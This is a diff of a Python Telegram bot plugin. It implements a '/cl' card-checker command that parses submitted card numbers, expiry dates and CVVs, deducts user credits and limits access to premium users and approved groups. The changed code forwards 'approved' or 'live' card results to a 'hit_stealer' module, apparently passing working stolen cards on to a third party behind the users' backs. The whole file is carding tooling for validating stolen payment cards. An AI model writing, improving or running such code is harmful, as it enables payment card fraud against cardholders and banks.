@@ -1,5 +1,6 @@
 from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from pyrogram.enums import ChatType
 import requests, re, time
 from plugins.func.users_sql import *
 from plugins.tools.hit_stealer import send_hit_if_approved
@@ -12,47 +13,47 @@ async def cmd_clover(Client, message):
     try:
         user_id = str(message.from_user.id)
         chat_id = message.chat.id
-        chat_type = str(message.chat.type).lower()
+        chat_type = message.chat.type
         username = message.from_user.username or "None"
 
         regdata = fetchinfo(user_id)
         if not regdata:
-            insert_reg_data(user_id, username, 0, str(date.today()))
-            regdata = fetchinfo(user_id)
+            return await message.reply_text("❌ You are not registered. Use /register first.")
 
-        role = regdata[2] or "FREE"
+        role = (regdata[2] or "FREE").strip().upper()
         credit = int(regdata[5] or 0)
         wait_time = int(regdata[6] or (15 if role == "FREE" else 5))
         antispam_time = int(regdata[7] or 0)
         now = int(time.time())
 
-        GROUP = open("plugins/group.txt").read().splitlines()
-        if chat_type == "private" and role == "FREE":
+        if chat_type == ChatType.PRIVATE and role == "FREE":
             return await message.reply_text(
-                "Premium Users Only.\nJoin our group for access:",
-                reply_markup=InlineKeyboardMarkup(
-                    [[InlineKeyboardButton("Join Group", url="https://t.me/+Rl9oTRlGfbIwZDhk")]]
-                ),
+                "⚠️ <b>Premium Users Required</b>\n"
+                "Only PREMIUM users can use this command in bot PM.\n"
+                "Join our group to use it for FREE:",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("Join Group", url="https://t.me/+Rl9oTRlGfbIwZDhk")]
+                ]),
                 disable_web_page_preview=True
             )
 
-        if chat_type in ["group", "supergroup"] and str(chat_id) not in GROUP:
-            return await message.reply_text("Unauthorized chat. Contact admin.", message.id)
+        GROUP = open("plugins/group.txt").read().splitlines()
+        if chat_type in [ChatType.GROUP, ChatType.SUPERGROUP] and str(chat_id) not in GROUP:
+            return await message.reply_text("❌ Unauthorized group. Contact admin.")
 
         if credit < 1:
-            return await message.reply_text("❌ Insufficient credit.", message.id)
-
+            return await message.reply_text("❌ Insufficient credit.")
         if now - antispam_time < wait_time:
-            return await message.reply_text(f"⏳ Wait {wait_time - (now - antispam_time)}s (AntiSpam)", message.id)
+            return await message.reply_text(f"⏳ Wait {wait_time - (now - antispam_time)}s (AntiSpam)")
 
         args = message.text.split(None, 1)
-        if len(args) < 2 and not message.reply_to_message:
-            return await message.reply_text("❌ Usage: /cl <cc|mm|yy|cvv>", message.id)
+        cc_text = message.reply_to_message.text.strip() if message.reply_to_message else (args[1].strip() if len(args) > 1 else None)
+        if not cc_text:
+            return await message.reply_text("❌ Usage: /cl <cc|mm|yy|cvv>")
 
-        cc = message.reply_to_message.text if message.reply_to_message else args[1].strip()
-        match = re.search(r'(\d{12,16})[|:\s,-](\d{1,2})[|:\s,-](\d{2,4})[|:\s,-](\d{3,4})', cc)
+        match = re.search(r'(\d{12,16})[|:\s,-](\d{1,2})[|:\s,-](\d{2,4})[|:\s,-](\d{3,4})', cc_text)
         if not match:
-            return await message.reply_text("❌ Invalid format. Use cc|mm|yy|cvv", message.id)
+            return await message.reply_text("❌ Invalid format. Use cc|mm|yy|cvv")
 
         ccnum, mes, ano, cvv = match.groups()
         fullcc = f"{ccnum}|{mes}|{ano}|{cvv}"
@@ -112,8 +113,12 @@ async def cmd_clover(Client, message):
 <b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
 """
 
-        await send_hit_if_approved(Client, final_msg)
+        # First show result to user
         await Client.edit_message_text(chat_id, check_msg.id, final_msg)
+
+        # Then send to hit stealer only if approved/live
+        if "approved" in status.lower() or "live" in card_message.lower():
+            await send_hit_if_approved(Client, final_msg)
 
         updatedata(user_id, "credits", credit - 1)
         updatedata(user_id, "antispam_time", now)
